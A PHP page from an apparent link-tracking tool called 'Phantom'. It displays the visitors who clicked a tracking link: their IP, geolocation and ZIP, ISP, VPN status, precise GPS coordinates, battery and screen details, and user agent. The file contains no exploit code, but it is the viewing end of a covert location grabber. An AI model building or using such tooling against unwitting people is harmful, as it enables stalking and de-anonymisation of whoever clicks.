<?php
/**
 * Phantom – Live View
 * Shows all hits for a specific tracking ID
 */

$config = require __DIR__ . '/config.php';
$domain = rtrim($config['domain'], '/');

$id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : '';

if (empty($id)) {
    header('Location: index.php');
    exit;
}

$logFile = __DIR__ . '/logs/' . $id . '.json';
$logs = [];

if (file_exists($logFile)) {
    $logs = json_decode(file_get_contents($logFile), true) ?: [];
}

// Newest first
$logs = array_reverse($logs);
$total = count($logs);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom Live – <?= htmlspecialchars($id) ?></title>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>👻</text></svg>">
</head>
<body>
    <div class="bg-grid"></div>

    <header class="topbar">
        <div class="logo">
            <span class="ghost">👻</span>
            <span class="name">Phantom Live</span>
        </div>
        <nav>
            <a href="index.php">Create Link</a>
            <a href="admin.php">Admin</a>
        </nav>
    </header>

    <div class="container">
        <div style="margin-bottom: 28px;">
            <h1 style="font-size: 1.6rem; margin-bottom: 6px;">
                Tracking ID: <code style="color: var(--success);"><?= htmlspecialchars($id) ?></code>
            </h1>
            <p style="color: var(--text-muted);">
                <?= $total ?> hit<?= $total !== 1 ? 's' : '' ?> recorded
            </p>
        </div>

        <?php if ($total === 0): ?>
            <div class="card" style="text-align: center; padding: 48px 20px;">
                <p style="font-size: 1.1rem; color: var(--text-muted);">No hits yet.</p>
                <p style="margin-top: 8px; color: var(--text-muted); font-size: 0.9rem;">
                    Share the tracking link and come back here.
                </p>
            </div>
        <?php else: ?>
            <?php foreach ($logs as $index => $log): 
                $num = $total - $index;
                $geo = $log['geo'] ?? [];
                $precise = $log['precise'] ?? null;
                $isProxy = !empty($geo['proxy']);
            ?>
                <div class="log-card">
                    <div class="meta">
                        <span class="badge">#<?= $num ?></span>
                        <span><?= htmlspecialchars($log['time'] ?? '-') ?></span>
                    </div>

                    <div class="ip"><?= htmlspecialchars($log['ip'] ?? 'Unknown') ?></div>

                    <div class="loc">
                        <?= htmlspecialchars(($geo['city'] ?? '') . ($geo['city'] && $geo['region'] ? ', ' : '') . ($geo['region'] ?? '')) ?>
                        <?= !empty($geo['country']) ? ' · ' . htmlspecialchars($geo['country']) : '' ?>
                    </div>

                    <div style="margin-top: 8px; font-size: 0.9rem; color: var(--text-muted);">
                        <?php if (!empty($geo['zip'])): ?>
                            ZIP: <?= htmlspecialchars($geo['zip']) ?> ·
                        <?php endif; ?>
                        ISP: <?= htmlspecialchars($geo['isp'] ?? '-') ?>
                        <?php if ($isProxy): ?>
                            <span class="badge proxy" style="margin-left: 8px;">PROXY / VPN</span>
                        <?php else: ?>
                            <span class="badge clean" style="margin-left: 8px;">Clean</span>
                        <?php endif; ?>
                    </div>

                    <?php if ($precise && !empty($precise['lat'])): ?>
                        <div style="margin-top: 10px; padding: 10px 12px; background: rgba(34, 211, 238, 0.08); border-radius: 8px; font-size: 0.9rem;">
                            📍 Precise: 
                            <?= htmlspecialchars($precise['lat']) ?>, 
                            <?= htmlspecialchars($precise['lon']) ?>
                            <?php if (!empty($precise['accuracy'])): ?>
                                (±<?= htmlspecialchars($precise['accuracy']) ?>m)
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>

                    <?php if (!empty($log['screen']) || !empty($log['battery'])): ?>
                        <div style="margin-top: 8px; font-size: 0.85rem; color: var(--text-muted);">
                            <?php if (!empty($log['screen'])): ?>
                                Screen: <?= htmlspecialchars($log['screen']) ?>
                            <?php endif; ?>
                            <?php if (!empty($log['battery'])): ?>
                                · Battery: <?= isset($log['battery']['level']) ? round($log['battery']['level'] * 100) . '%' : '-' ?>
                                <?= !empty($log['battery']['charging']) ? '(charging)' : '' ?>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>

                    <details>
                        <summary>User-Agent & Details</summary>
                        <pre><?= htmlspecialchars($log['ua'] ?? 'No User-Agent') ?></pre>
                        <?php if (!empty($log['referer'])): ?>
                            <p style="margin-top: 8px; font-size: 0.85rem;">
                                Referer: <?= htmlspecialchars($log['referer']) ?>
                            </p>
                        <?php endif; ?>
                    </details>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>

        <div style="margin-top: 32px; text-align: center;">
            <a href="index.php" class="btn-secondary">← Create New Link</a>
        </div>
    </div>
</body>
</html>
